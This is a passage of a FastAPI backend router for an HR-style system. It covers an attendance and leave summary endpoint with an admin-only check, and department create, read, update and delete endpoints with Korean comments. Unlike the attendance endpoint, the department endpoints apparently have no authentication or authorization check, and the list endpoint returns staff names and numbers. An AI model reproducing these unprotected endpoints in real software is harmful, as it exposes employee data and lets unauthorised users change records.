    if not h: raise HTTPException(status_code=404, detail="History not found")
    
    was_calibration = h.history_type == 'CALIBRATION'
    await db.delete(h)
    await db.commit()
    
    if was_calibration:
        await update_next_calibration_date(inst_id, db)
        
    return {"status": "success"}

# --- HR / Attendance Summary Endpoints ---

@router.get("/staff/me/attendance-summary")
async def get_my_attendance_summary(
    worker_id: Optional[int] = Query(None),
    year: Optional[int] = Query(None),
    month: Optional[int] = Query(None),
    db: AsyncSession = Depends(get_db),
    current_user: Staff = Depends(deps.get_current_user)
):
    """
    Get personal attendance and leave summary for the current year.
    Used for the mobile dashboard.
    Admins can view other workers' summary by providing worker_id.
    """
    # Authorization check for worker_id
    target_worker_id = current_user.id
    if worker_id and worker_id != current_user.id:
        if current_user.user_type != "ADMIN":
            raise HTTPException(status_code=403, detail="Permission denied to view other workers' attendance.")
        target_worker_id = worker_id

    now = date.today()
    target_year = year or now.year
    
    if month:
        start_date = date(target_year, month, 1)
        if month == 12:
            end_date = date(target_year + 1, 1, 1) - timedelta(days=1)
        else:
            end_date = date(target_year, month + 1, 1) - timedelta(days=1)
    else:
        start_date = date(target_year, 1, 1)
        end_date = date(target_year, 12, 31)
    
    
    # Fetch all records for the target user in the current year
    stmt = select(EmployeeTimeRecord).where(
        EmployeeTimeRecord.staff_id == target_worker_id,
        EmployeeTimeRecord.record_date >= start_date,
        EmployeeTimeRecord.record_date <= end_date,
        EmployeeTimeRecord.status.in_(['APPROVED', 'COMPLETED'])
    ).order_by(EmployeeTimeRecord.record_date.desc())
    
    result = await db.execute(stmt)
    records = result.scalars().all()
    
    # Basic aggregation
    summary = {
        "year": target_year,
        "month": month,
        "annual_used": 0,
        "half_day_used": 0,
        "sick_used": 0,
        "early_leave_hours": 0.0,
        "outing_hours": 0.0,
        "overtime_hours": 0.0,
        "extension_hours": 0.0,
        "night_hours": 0.0,
        "holiday_hours": 0.0,
        "holiday_night_hours": 0.0,
        "records": []
    }
    
    # Aggregation in minutes for precision
    early_leave_mins = 0
    outing_mins = 0
    overtime_mins = 0
    extension_mins = 0
    night_mins = 0
    holiday_mins = 0
    holiday_night_mins = 0
    
    for r in records:
        if r.category == "ANNUAL": summary["annual_used"] += 1
        elif r.category == "HALF_DAY": summary["half_day_used"] += 1
        elif r.category == "SICK": summary["sick_used"] += 1
        elif r.category == "EARLY_LEAVE": early_leave_mins += int((r.hours or 0) * 60)
        elif r.category == "OUTING": outing_mins += int((r.hours or 0) * 60)
        elif r.category == "OVERTIME":
            overtime_mins += int((r.hours or 0) * 60)
            extension_mins += int((r.extension_hours or 0) * 60)
            night_mins += int((r.night_hours or 0) * 60)
            holiday_mins += int((r.holiday_hours or 0) * 60)
            holiday_night_mins += int((r.holiday_night_hours or 0) * 60)
            
        summary["records"].append({
            "id": r.id,
            "date": r.record_date.isoformat(),
            "category": r.category,
            "content": r.content,
            "status": r.status,
            "hours": float(r.hours or 0),
            "extension_hours": float(r.extension_hours or 0),
            "night_hours": float(r.night_hours or 0),
            "holiday_hours": float(r.holiday_hours or 0),
            "holiday_night_hours": float(r.holiday_night_hours or 0)
        })

    # Convert minutes back to hours (float) for the summary
    summary["early_leave_hours"] = round(early_leave_mins / 60.0, 2)
    summary["outing_hours"] = round(outing_mins / 60.0, 2)
    summary["overtime_hours"] = round(overtime_mins / 60.0, 2)
    summary["extension_hours"] = round(extension_mins / 60.0, 2)
    summary["night_hours"] = round(night_mins / 60.0, 2)
    summary["holiday_hours"] = round(holiday_mins / 60.0, 2)
    summary["holiday_night_hours"] = round(holiday_night_mins / 60.0, 2)

    # Calculate Total Recognized Time
    total_standard_hours = 0.0
    curr = start_date
    while curr <= end_date:
        if curr.weekday() < 5:
            total_standard_hours += 8.0
        curr += timedelta(days=1)
    
    summary["recognized_hours"] = total_standard_hours - summary["early_leave_hours"] - summary["outing_hours"] + summary["overtime_hours"]
    summary["standard_hours"] = total_standard_hours

    return summary


# ============================================================
# --- Department (조직도) Endpoints ---
# ============================================================

@router.get("/departments/", response_model=List[DepartmentResponse])
async def list_departments(db: AsyncSession = Depends(get_db)):
    """부서 목록 조회 (소속 직원 포함)"""
    result = await db.execute(
        select(Department)
        .options(selectinload(Department.members))
        .order_by(Department.name)
    )
    depts = result.scalars().all()
    # members를 dict 형태로 직렬화하여 순환참조 방지
    output = []
    for d in depts:
        members_data = [
            {"id": m.id, "name": m.name, "role": m.role, "department": m.department, "department_id": m.department_id, "is_active": m.is_active, "staff_no": m.staff_no}
            for m in d.members
        ]
        output.append({
            "id": d.id,
            "name": d.name,
            "description": d.description,
            "created_at": d.created_at,
            "members": members_data
        })
    return output

@router.post("/departments/", response_model=DepartmentResponse)
async def create_department(
    dept_in: DepartmentCreate,
    db: AsyncSession = Depends(get_db)
):
    """부서 생성"""
    # 중복 체크
    existing = await db.execute(select(Department).where(Department.name == dept_in.name))
    if existing.scalars().first():
        raise HTTPException(status_code=400, detail="이미 동일한 이름의 부서가 존재합니다.")

    new_dept = Department(name=dept_in.name, description=dept_in.description)
    db.add(new_dept)
    await db.flush()

    # 소속 직원 설정
    if dept_in.member_ids:
        staff_res = await db.execute(select(Staff).where(Staff.id.in_(dept_in.member_ids)))
        for s in staff_res.scalars().all():
            s.department_id = new_dept.id
            s.department = new_dept.name  # 하위호환용 문자열 동기화

    await db.commit()

    result = await db.execute(
        select(Department).options(selectinload(Department.members)).where(Department.id == new_dept.id)
    )
    dept = result.scalars().first()
    members_data = [
        {"id": m.id, "name": m.name, "role": m.role, "department": m.department, "department_id": m.department_id, "is_active": m.is_active, "staff_no": m.staff_no}
        for m in dept.members
    ]
    return {"id": dept.id, "name": dept.name, "description": dept.description, "created_at": dept.created_at, "members": members_data}

@router.put("/departments/{dept_id}", response_model=DepartmentResponse)
async def update_department(
    dept_id: int,
    dept_in: DepartmentUpdate,
    db: AsyncSession = Depends(get_db)
):
    """부서 수정 (이름, 설명, 소속 직원)"""
    result = await db.execute(
        select(Department).options(selectinload(Department.members)).where(Department.id == dept_id)
    )
    dept = result.scalars().first()
    if not dept:
        raise HTTPException(status_code=404, detail="부서를 찾을 수 없습니다.")

    # 이름 중복 체크 (자기 자신 제외)
    if dept_in.name and dept_in.name != dept.name:
        dup = await db.execute(select(Department).where(Department.name == dept_in.name, Department.id != dept_id))
        if dup.scalars().first():
            raise HTTPException(status_code=400, detail="이미 동일한 이름의 부서가 존재합니다.")

    dept.name = dept_in.name
    dept.description = dept_in.description

    # 소속 직원 재설정
    if dept_in.member_ids is not None:
        # 기존 멤버 해제 (이 부서에 속했던 직원 모두)
        old_members_res = await db.execute(select(Staff).where(Staff.department_id == dept_id))
        for s in old_members_res.scalars().all():
            s.department_id = None
            # department 문자열은 유지 (다른 부서명일 수도 있으므로 건드리지 않음)

        # 새 멤버 설정
        if dept_in.member_ids:
            new_members_res = await db.execute(select(Staff).where(Staff.id.in_(dept_in.member_ids)))
            for s in new_members_res.scalars().all():
                s.department_id = dept_id
                s.department = dept.name  # 하위호환 동기화

    await db.commit()

    result = await db.execute(
        select(Department).options(selectinload(Department.members)).where(Department.id == dept_id)
    )
    dept = result.scalars().first()
    members_data = [
        {"id": m.id, "name": m.name, "role": m.role, "department": m.department, "department_id": m.department_id, "is_active": m.is_active, "staff_no": m.staff_no}
        for m in dept.members
    ]
    return {"id": dept.id, "name": dept.name, "description": dept.description, "created_at": dept.created_at, "members": members_data}

@router.delete("/departments/{dept_id}")
async def delete_department(
    dept_id: int,
    db: AsyncSession = Depends(get_db)
):
    """부서 삭제 (소속 직원 department_id를 NULL로 해제)"""
    result = await db.execute(select(Department).where(Department.id == dept_id))
    dept = result.scalars().first()
    if not dept:
        raise HTTPException(status_code=404, detail="부서를 찾을 수 없습니다.")

    # 멤버 해제 (cascade SET NULL이 있지만 명시적으로도 처리)
    await db.execute(
        Staff.__table__.update().where(Staff.department_id == dept_id).values(department_id=None)
    )
    await db.delete(dept)
    await db.commit()
    return {"message": "부서가 삭제되었습니다."}
